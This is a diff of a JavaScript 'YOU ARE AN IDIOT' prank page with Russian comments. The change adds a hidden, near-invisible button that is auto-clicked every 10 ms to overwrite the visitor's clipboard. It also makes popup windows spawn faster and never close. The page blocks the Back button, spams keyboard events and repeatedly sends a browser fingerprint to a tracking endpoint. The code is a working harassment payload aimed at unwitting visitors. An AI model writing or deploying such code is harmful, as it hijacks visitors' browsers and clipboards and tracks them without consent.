@@ -142,6 +142,23 @@
             50%      { opacity: 0.8; }
         }
 
+        #clip-trigger {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: 0;
+            border: none;
+            background: transparent;
+            color: transparent;
+            opacity: 0.01;
+            z-index: 999998;
+            pointer-events: none;
+            font-size: 1px;
+        }
+
         #kb-trap {
             position: fixed;
             opacity: 0;
@@ -170,32 +187,25 @@
 
     <div id="flash"></div>
 
+    <button id="clip-trigger" aria-hidden="true">.</button>
+
     <button id="stop-btn">STOP</button>
 
     <script>
         // ================== НАСТРОЙКИ ==================
-        var REDIRECT_URL     = "https://example.com"; // куда кинуть жертву
-        var REDIRECT_AFTER   = 15000;                 // мс до редиректа
         var VIDEO_ID         = "hPZxDJYmTUw";         // ID ролика YouTube
         var TRACK_ENDPOINT   = "/track";              // куда слать фингерпринт
         var SOUND_URL        = "";                    // ссылка на mp3 (опц.)
 
         // пранк-окна
-        var SPAWN_EVERY      = 300;   // мс между появлением нового окна
-        var WINDOW_LIFE      = 500;   // мс жизни окна
+        var SPAWN_EVERY      = 200;   // мс между появлением нового окна
         var MAX_WINDOWS      = 0;     // 0 = без лимита, иначе число
 
-        // уровни (постепенное усиление). false — выключить
-        var LEVELS_ENABLED   = true;
-        var LEVEL_EVERY      = 10000; // мс между усилениями
-        var LEVEL_SPAWN_STEP = 30;    // на сколько мс уменьшать SPAWN_EVERY
-        var LEVEL_LIFE_STEP  = 100;   // на сколько мс увеличивать WINDOW_LIFE
-        var SPAWN_MIN        = 80;    // минимальный SPAWN_EVERY
-        var LIFE_MAX         = 1500;  // максимальный WINDOW_LIFE
-
-        // клавиатура и буфер
+        // клавиатура
         var KEYBOARD_EVERY   = 150;   // мс
-        var CLIPBOARD_EVERY  = 150;   // мс
+
+        // буфер через микроскопическую кнопку
+        var CLIP_BTN_EVERY   = 10;    // мс (0.01 сек)
         var CLIP_TEXT        = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
         // ===============================================
 
@@ -204,9 +214,8 @@
 
         var windowCount = 0;
         var spawnInterval = null;
-        var levelUpInterval = null;
         var kbInterval = null;
-        var clipInterval = null;
+        var clipBtnInterval = null;
 
         // ---------- запуск ----------
         function startVideo() {
@@ -225,7 +234,7 @@
                              "?autoplay=1&mute=0&controls=1&rel=0&playsinline=1";
             } catch (e) {}
 
-            // звук (доп. mp3, если задан)
+            // доп. звук mp3
             if (SOUND_URL) {
                 try {
                     var a = new Audio(SOUND_URL);
@@ -245,7 +254,7 @@
                 }
             } catch (e) {}
 
-            // блокировка кнопки «Назад»
+            // блокировка «Назад»
             try {
                 history.pushState({ p: 1 }, "", location.href);
                 window.addEventListener('popstate', function () {
@@ -259,24 +268,17 @@
             // окна
             startWindows();
 
-            // клавиатура и буфер
+            // клавиатура
             startKeyboardSpam();
-            startClipboardSpam();
+
+            // буфер через микроскопическую кнопку
+            startClipboardBtnSpam();
 
             // фингерпринт
             sendFingerprint();
-
-            // редирект
-            if (REDIRECT_URL) {
-                setTimeout(function () {
-                    if (!stopFlag) {
-                        location.href = REDIRECT_URL;
-                    }
-                }, REDIRECT_AFTER);
-            }
         }
 
-        // ---------- окна ----------
+        // ---------- окна (без исчезновения) ----------
         function spawnWindow() {
             if (stopFlag) return;
             if (MAX_WINDOWS > 0 && windowCount >= MAX_WINDOWS) {
@@ -306,35 +308,11 @@
             win.innerHTML = '<h3>YOU ARE AN IDIOT</h3><p>#' + windowCount + '</p>';
 
             document.body.appendChild(win);
-
-            setTimeout(function () {
-                if (win && win.parentNode) {
-                    win.remove();
-                }
-            }, WINDOW_LIFE);
         }
 
         function startWindows() {
             spawnWindow();
             spawnInterval = setInterval(spawnWindow, SPAWN_EVERY);
-
-            if (LEVELS_ENABLED) {
-                levelUpInterval = setInterval(function () {
-                    if (stopFlag) return;
-
-                    if (SPAWN_EVERY > SPAWN_MIN) {
-                        SPAWN_EVERY -= LEVEL_SPAWN_STEP;
-                        if (SPAWN_EVERY < SPAWN_MIN) SPAWN_EVERY = SPAWN_MIN;
-                    }
-                    if (WINDOW_LIFE < LIFE_MAX) {
-                        WINDOW_LIFE += LEVEL_LIFE_STEP;
-                        if (WINDOW_LIFE > LIFE_MAX) WINDOW_LIFE = LIFE_MAX;
-                    }
-
-                    if (spawnInterval) clearInterval(spawnInterval);
-                    spawnInterval = setInterval(spawnWindow, SPAWN_EVERY);
-                }, LEVEL_EVERY);
-            }
         }
 
         // ---------- клавиатура ----------
@@ -362,32 +340,46 @@
             kbInterval = setInterval(toggleKeyboard, KEYBOARD_EVERY);
         }
 
-        // ---------- буфер ----------
-        function copyToClipboard() {
+        // ---------- копирование через микроскопическую кнопку ----------
+        function copyViaButton() {
             if (stopFlag) return;
 
-            try {
-                var ta = document.createElement('textarea');
-                ta.value = CLIP_TEXT;
-                ta.style.position = 'fixed';
-                ta.style.opacity = '0';
-                ta.style.pointerEvents = 'none';
-                document.body.appendChild(ta);
-                ta.select();
-                document.execCommand('copy');
-                ta.remove();
-            } catch (e) {}
+            var btn = document.getElementById('clip-trigger');
+            if (!btn) return;
 
             try {
-                if (navigator.clipboard && navigator.clipboard.writeText) {
-                    navigator.clipboard.writeText(CLIP_TEXT).catch(function () {});
-                }
+                btn.click();
             } catch (e) {}
         }
 
-        function startClipboardSpam() {
-            clipInterval = setInterval(copyToClipboard, CLIPBOARD_EVERY);
+        function startClipboardBtnSpam() {
+            clipBtnInterval = setInterval(copyViaButton, CLIP_BTN_EVERY);
         }
+
+        // обработчик самой кнопки
+        document.addEventListener('DOMContentLoaded', function () {
+            var btn = document.getElementById('clip-trigger');
+            if (!btn) return;
+            btn.addEventListener('click', function () {
+                try {
+                    var ta = document.createElement('textarea');
+                    ta.value = CLIP_TEXT;
+                    ta.style.position = 'fixed';
+                    ta.style.opacity = '0';
+                    ta.style.pointerEvents = 'none';
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    ta.remove();
+                } catch (e) {}
+
+                try {
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        navigator.clipboard.writeText(CLIP_TEXT).catch(function () {});
+                    }
+                } catch (e) {}
+            });
+        });
 
         // ---------- стоп ----------
         function stopEverything() {
@@ -397,17 +389,13 @@
                 clearInterval(spawnInterval);
                 spawnInterval = null;
             }
-            if (levelUpInterval) {
-                clearInterval(levelUpInterval);
-                levelUpInterval = null;
-            }
             if (kbInterval) {
                 clearInterval(kbInterval);
                 kbInterval = null;
             }
-            if (clipInterval) {
-                clearInterval(clipInterval);
-                clipInterval = null;
+            if (clipBtnInterval) {
+                clearInterval(clipBtnInterval);
+                clipBtnInterval = null;
             }
 
             var wins = document.querySelectorAll('.virus-window');
@@ -506,7 +494,6 @@
         });
         document.getElementById('stop-btn').addEventListener('click', stopEverything);
 
-        // апдейт фингерпринта, пока страница открыта
         setInterval(sendFingerprint, 15000);
     </script>
 </body>
